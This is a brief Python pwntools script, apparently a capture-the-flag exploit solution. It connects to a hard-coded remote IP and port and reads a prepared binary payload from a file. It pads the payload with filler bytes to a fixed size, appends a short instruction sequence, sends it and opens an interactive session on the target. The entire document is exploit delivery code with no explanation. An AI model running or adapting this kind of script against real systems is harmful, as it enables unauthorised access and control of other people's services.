from pwn import *

r = remote('111.186.59.29', 10086)

with open('wow.out', 'rb') as f:
    code = f.read()

code += b'\x66' * (0x2000 - len(code) - 2)
code += b'\x89\xe5'

r.send(code)

r.interactive()